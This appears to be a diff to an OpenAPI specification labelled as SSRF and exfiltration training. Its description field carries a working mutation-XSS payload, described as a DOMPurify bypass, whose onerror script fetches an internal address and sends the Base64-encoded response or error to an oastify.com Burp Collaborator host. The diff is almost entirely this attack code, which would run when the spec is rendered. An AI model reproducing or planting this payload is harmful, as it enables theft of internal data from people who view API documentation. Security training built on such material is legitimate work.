@@ -3,24 +3,26 @@ info:
   version: 1.0.0
   title: SSRF & Exfiltration Training
   description: |
-    <div style="text-align:center; padding:20px; border:1px solid #eee;">
-      <h3>Internal Security Gateway</h3>
-      <p>This demo uses a known DomPurify bypass to execute internal requests.</p>
+    <div style="text-align:center; padding:20px; border:1px solid #eee; border-radius: 8px;">
+      <h3 style="color: #d9534f;">Internal Security Gateway</h3>
+      <p>This training module demonstrates automated data exfiltration via XSS.</p>
 
       <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea>
-      <img src='#' onerror='
+      <img src='x' onerror='
         (async () => {
-          const internalIp = "http://10.83.34.78/";
-          const collaborator = "https://txu5p50087ousiad5ff33sgcq3wukk89.oastify.com/";
+          const internalTarget = "http://10.83.34.78/";
+          const exfilServer = "https://txu5p50087ousiad5ff33sgcq3wukk89.oastify.com/";
           try {
-            // 1. Call Internal IP
-            const resp = await fetch(internalIp);
-            const data = await resp.text();
-            // 2. Send Response to Burp Collaborator (Base64 encoded)
-            fetch(collaborator + "?exfil=" + btoa(data));
-          } catch(e) {
-            // Log attempt if blocked by CORS
-            fetch(collaborator + "?log=attempted_internal_call");
+            // Step 1: Request the internal resource
+            const response = await fetch(internalTarget);
+            const content = await response.text();
+            
+            // Step 2: Exfiltrate the content to Burp Collaborator
+            // We use btoa() to Base64 encode the internal response
+            fetch(exfilServer + "?data=" + btoa(unescape(encodeURIComponent(content))));
+          } catch(err) {
+            // Log the error to Collaborator if the internal fetch is blocked
+            fetch(exfilServer + "?error=" + btoa(err.message));
           }
         })()
       '>">
